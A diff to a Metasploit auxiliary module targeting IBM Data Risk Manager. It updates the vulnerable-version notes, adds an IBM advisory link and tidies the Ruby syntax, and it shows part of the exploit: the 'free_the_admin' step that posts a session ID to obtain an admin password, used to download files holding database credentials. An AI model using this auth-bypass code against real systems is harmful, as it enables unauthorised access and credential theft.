@@ -21,8 +21,8 @@ class MetasploitModule < Msf::Auxiliary
           A downloaded file is zipped, and this module also unzips it before storing it in the database.
           By default this module downloads Tomcat's application.properties files, which contains the
           database password, amongst other sensitive data.
-          At the time of disclosure, this is a 0 day. Versions 2.0.3 and 2.0.2 are confirmed to be
-          affected, and the latest 2.0.6 is most likely affected too. Version 2.0.1 is not vulnerable.
+          At the time of disclosure, this is was a 0 day, but IBM later patched it and released their advisory.
+          Versions 2.0.2 to 2.0.4 are vulnerable, version 2.0.1 is not.
         },
         'Author' =>
           [
@@ -38,11 +38,12 @@ class MetasploitModule < Msf::Auxiliary
             [ 'CVE', '2020-4427' ], # auth bypass
             [ 'CVE', '2020-4429' ], # insecure default password
             [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md' ],
-            [ 'URL', 'https://seclists.org/fulldisclosure/2020/Apr/33' ]
+            [ 'URL', 'https://seclists.org/fulldisclosure/2020/Apr/33' ],
+            [ 'URL', 'https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/']
           ],
         'DisclosureDate' => '2020-04-21',
         'Actions' => [
-          ['Download', 'Description' => 'Download arbitrary file']
+          ['Download', { 'Description' => 'Download arbitrary file' }]
         ],
         'DefaultAction' => 'Download'
       )
@@ -101,11 +102,11 @@ class MetasploitModule < Msf::Auxiliary
   def free_the_admin(session_id)
     # step 2: give the session ID to the server and have it grant us a free admin password
     post_data = Rex::MIME::Message.new
-    post_data.add_part('', nil, nil, content_disposition = 'form-data; name="deviceid"')
-    post_data.add_part(Rex::Text.rand_text_alpha(8..15), nil, nil, content_disposition = 'form-data; name="password"')
-    post_data.add_part('admin', nil, nil, content_disposition = 'form-data; name="username"')
-    post_data.add_part('', nil, nil, content_disposition = 'form-data; name="clientDetails"')
-    post_data.add_part(session_id, nil, nil, content_disposition = 'form-data; name="sessionId"')
+    post_data.add_part('', nil, nil, 'form-data; name="deviceid"')
+    post_data.add_part(Rex::Text.rand_text_alpha(8..15), nil, nil, 'form-data; name="password"')
+    post_data.add_part('admin', nil, nil, 'form-data; name="username"')
+    post_data.add_part('', nil, nil, 'form-data; name="clientDetails"')
+    post_data.add_part(session_id, nil, nil, 'form-data; name="sessionId"')
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'albatross', 'user', 'login'),
